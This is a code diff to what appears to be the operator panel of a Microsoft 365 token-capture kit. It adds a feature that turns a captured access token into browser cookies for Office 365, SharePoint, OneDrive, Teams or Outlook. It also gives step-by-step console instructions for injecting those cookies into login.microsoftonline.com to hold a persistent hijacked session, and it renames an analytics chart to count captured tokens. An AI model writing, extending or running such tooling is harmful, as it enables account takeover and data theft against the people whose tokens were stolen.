@@ -64,6 +64,49 @@
                 <option value="oldest">Oldest first</option>
             </select>
             <button class="btn-accent-sm" onclick="loadTokens()">Apply</button>
+            <button class="btn-outline" onclick="toggleManualConvert()" style="margin-left:auto;"><i class="fas fa-exchange-alt"></i> Convert Token to Cookies</button>
+        </div>
+
+        <!-- Manual Cookie Conversion -->
+        <div id="manualConvertSection" style="display:none;margin-bottom:16px;">
+            <div class="card" style="padding:16px;border:1px dashed var(--border);">
+                <div style="display:flex;align-items:center;gap:8px;margin-bottom:12px;">
+                    <i class="fas fa-info-circle" style="color:var(--accent);"></i>
+                    <span style="font-size:12px;color:var(--muted);">Convert a raw access token to browser cookies. Paste an access token from token-mode capture.</span>
+                </div>
+                <div style="display:grid;grid-template-columns:1fr 1fr auto;gap:8px;align-items:end;">
+                    <div class="form-group" style="margin-bottom:0;">
+                        <label style="font-size:10px;text-transform:uppercase;letter-spacing:0.05em;color:var(--muted);">Access Token</label>
+                        <textarea id="manualAccessToken" placeholder="Paste raw access token here..." style="width:100%;padding:8px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:6px;color:var(--text-main);font-size:10px;resize:vertical;min-height:60px;outline:none;font-family:'Courier New',monospace;"></textarea>
+                    </div>
+                    <div class="form-group" style="margin-bottom:0;">
+                        <label style="font-size:10px;text-transform:uppercase;letter-spacing:0.05em;color:var(--muted);">Template Type</label>
+                        <select id="manualTemplateType" style="width:100%;padding:8px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:6px;color:var(--text-main);font-size:11px;outline:none;">
+                            <option value="office">Office 365</option>
+                            <option value="sharepoint">SharePoint</option>
+                            <option value="onedrive">OneDrive</option>
+                            <option value="teams">Teams</option>
+                            <option value="outlook">Outlook</option>
+                        </select>
+                    </div>
+                    <button class="btn-accent-sm" onclick="convertManualToken()" style="height:36px;white-space:nowrap;"><i class="fas fa-exchange-alt"></i> Convert</button>
+                </div>
+                <div id="manualConvertResult" style="margin-top:12px;display:none;">
+                    <div style="background:rgba(0,255,204,0.06);border:1px solid rgba(0,255,204,0.2);border-radius:8px;padding:12px;">
+                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
+                            <span style="font-size:11px;font-weight:600;color:var(--accent);"><i class="fas fa-check-circle"></i> Conversion Successful</span>
+                            <button class="btn-outline" style="padding:4px 10px;font-size:10px;" onclick="copyManualCookies()"><i class="fas fa-copy"></i> Copy Cookies</button>
+                        </div>
+                        <textarea id="manualCookiesOutput" readonly style="width:100%;min-height:80px;padding:8px;background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:6px;color:var(--accent);font-size:10px;resize:vertical;font-family:'Courier New',monospace;outline:none;"></textarea>
+                        <div style="margin-top:8px;font-size:10px;color:var(--muted);line-height:1.5;">
+                            <strong style="color:var(--text-main);">Inject Instructions:</strong><br>
+                            1. Open browser console (F12) on any Microsoft login page<br>
+                            2. Paste and run: <code style="background:rgba(255,255,255,0.05);padding:2px 6px;border-radius:4px;">document.cookie = "PASTE_COOKIE_HERE; domain=.login.microsoftonline.com; path=/; secure; samesite=none"</code><br>
+                            3. Refresh the page to maintain persistent session
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
 
         <div class="card" style="overflow:hidden;">
@@ -100,10 +143,11 @@
             <div style="padding:16px;">
                 <div style="background:rgba(0,255,204,0.08);border:1px solid rgba(0,255,204,0.2);border-radius:8px;padding:14px;margin-bottom:16px;font-size:12px;line-height:1.6;color:var(--text-main);">
                     <strong style="color:var(--accent);margin-bottom:8px;display:block;"><i class="fas fa-clipboard-list"></i> Instructions:</strong>
-                    1. Open <a href="https://login.microsoftonline.com" target="_blank" style="color:var(--accent);text-decoration:underline;">https://login.microsoftonline.com</a> in Chrome/Edge<br>
-                    2. Press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">F12</kbd> → Go to Console tab<br>
-                    3. Paste the script below and press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">Enter</kbd><br>
-                    4. Wait ~3 seconds for completion
+                    1. Navigate to <a href="https://outlook.office365.com" target="_blank" style="color:var(--accent);text-decoration:underline;">outlook.office365.com</a> in Chrome/Edge<br>
+                    2. When prompted to sign in, click <strong>"Cancel"</strong> or <strong>"No"</strong><br>
+                    3. Press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">F12</kbd> → Go to Console tab<br>
+                    4. Paste the script below and press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">Enter</kbd><br>
+                    5. Press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">F5</kbd> to refresh the page
                 </div>
                 <textarea id="cookieScriptOutput" readonly style="width:100%;min-height:180px;font-family:'Courier New',monospace;font-size:10px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:8px;color:var(--accent);padding:12px;resize:vertical;line-height:1.5;"></textarea>
                 <div style="display:flex;gap:8px;margin-top:12px;">
@@ -349,6 +393,47 @@
             navigator.clipboard.writeText(text).then(() => showToast('Copied to clipboard'));
         }
 
+        function toggleManualConvert() {
+            const section = document.getElementById('manualConvertSection');
+            section.style.display = section.style.display === 'none' ? 'block' : 'none';
+        }
+
+        async function convertManualToken() {
+            const accessToken = document.getElementById('manualAccessToken').value.trim();
+            const templateType = document.getElementById('manualTemplateType').value;
+            const resultDiv = document.getElementById('manualConvertResult');
+            const output = document.getElementById('manualCookiesOutput');
+
+            if (!accessToken) {
+                return showToast('Please paste an access token', true);
+            }
+
+            try {
+                const res = await fetch(`${API}/tokens/convert-cookie`, {
+                    method: 'POST',
+                    headers: authHeaders(),
+                    body: JSON.stringify({ access_token: accessToken, template_type: templateType })
+                });
+                const data = await res.json();
+
+                if (data.success) {
+                    output.value = data.cookies;
+                    resultDiv.style.display = 'block';
+                    showToast('Cookies generated successfully');
+                } else {
+                    showToast('Conversion failed: ' + (data.error || 'Unknown error'), true);
+                }
+            } catch(e) {
+                showToast('Conversion failed: ' + e.message, true);
+            }
+        }
+
+        function copyManualCookies() {
+            const text = document.getElementById('manualCookiesOutput').value;
+            if (!text) return showToast('No cookies to copy', true);
+            navigator.clipboard.writeText(text).then(() => showToast('Cookies copied to clipboard'));
+        }
+
         function copyScriptOutput() {
             const text = document.getElementById('cookieScriptOutput').value;
             if (text === 'Generating script...' || !text) return showToast('No script to copy', true);
@@ -373,7 +458,7 @@
 
         async function loadChart(days) {
             try {
-                const res = await fetch(`${API}/analytics/visitors/daily?days=${days}`, { headers: authHeaders() });
+                const res = await fetch(`${API}/analytics/tokens/daily?days=${days}`, { headers: authHeaders() });
                 const data = await res.json();
                 if (!data || !data.length) {
                     document.getElementById('chartInsights').innerHTML = '<div style="grid-column:1/-1;text-align:center;color:var(--muted);padding:40px;"><i class="fas fa-chart-line" style="font-size:32px;margin-bottom:12px;opacity:0.3;"></i><p>No data available for this period</p></div>';
